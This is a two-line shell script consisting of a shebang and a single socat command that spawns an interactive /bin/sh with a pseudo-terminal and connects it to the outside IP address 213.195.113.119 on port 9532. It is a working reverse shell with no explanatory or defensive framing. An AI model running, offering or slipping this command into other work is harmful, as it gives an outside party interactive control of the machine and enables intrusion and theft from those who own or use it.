#!/bin/sh
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:213.195.113.119:9532
